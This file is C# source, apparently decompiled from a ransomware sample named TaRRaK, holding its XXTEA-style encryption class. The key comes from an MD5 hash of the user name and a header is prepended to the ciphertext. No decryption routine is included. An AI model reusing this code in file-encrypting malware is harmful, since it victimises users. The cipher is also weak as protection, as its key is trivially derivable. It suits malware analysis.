using System;
using System.Security.Cryptography;
using System.Text;

namespace TaRRaK;

public class Encrypter
{
	private const uint Delta = 3735929054u;

	private readonly byte[] _key;

	private readonly byte[] _header;

	public static readonly byte[] SystemId = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(Environment.UserName));

	public Encrypter(string header)
	{
		_header = Encoding.ASCII.GetBytes(header);
		_key = FixKey(SystemId);
	}

	public byte[] Encrypt(byte[] data)
	{
		if (data.Length == 0)
		{
			return data;
		}
		return ToByteArray(Encrypt(ToUInt32Array(data, includeLength: true), ToUInt32Array(_key, includeLength: false)), includeLength: false);
	}

	private uint[] Encrypt(uint[] v, uint[] k)
	{
		int num = v.Length - 1;
		if (num < 1)
		{
			return v;
		}
		uint z = v[num];
		uint num2 = 0u;
		int num3 = 6 + 52 / (num + 1);
		while (0 < num3--)
		{
			num2 += 3735929054u;
			uint e = (num2 >> 2) & 3u;
			int i;
			uint y;
			for (i = 0; i < num; i++)
			{
				y = v[i + 1];
				z = (v[i] += MX(num2, y, z, i, e, k));
			}
			y = v[0];
			z = (v[num] += MX(num2, y, z, i, e, k));
		}
		return v;
	}

	private uint MX(uint sum, uint y, uint z, int p, uint e, uint[] k)
	{
		return (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((sum ^ y) + (k[(p & 3) ^ e] ^ z));
	}

	private byte[] FixKey(byte[] key)
	{
		if (key.Length == 16)
		{
			return key;
		}
		byte[] array = new byte[16];
		if (key.Length < 16)
		{
			key.CopyTo(array, 0);
		}
		else
		{
			Array.Copy(key, 0, array, 0, 16);
		}
		return array;
	}

	private uint[] ToUInt32Array(byte[] data, bool includeLength)
	{
		int num = data.Length;
		int num2 = (((num & 3) == 0) ? (num >> 2) : ((num >> 2) + 1));
		uint[] array;
		if (includeLength)
		{
			array = new uint[num2 + 1];
			array[num2] = (uint)num;
		}
		else
		{
			array = new uint[num2];
		}
		for (int i = 0; i < num; i++)
		{
			array[i >> 2] |= (uint)(data[i] << ((i & 3) << 3));
		}
		return array;
	}

	private byte[] ToByteArray(uint[] data, bool includeLength)
	{
		int num = data.Length << 2;
		if (includeLength)
		{
			int num2 = (int)data[^1];
			num -= 4;
			if (num2 < num - 3 || num2 > num)
			{
				return null;
			}
			num = num2;
		}
		byte[] array = new byte[num + _header.Length];
		Buffer.BlockCopy(_header, 0, array, 0, _header.Length);
		for (int i = 0; i < num; i++)
		{
			array[i + _header.Length] = (byte)(data[i >> 2] >> ((i & 3) << 3));
		}
		return array;
	}
}
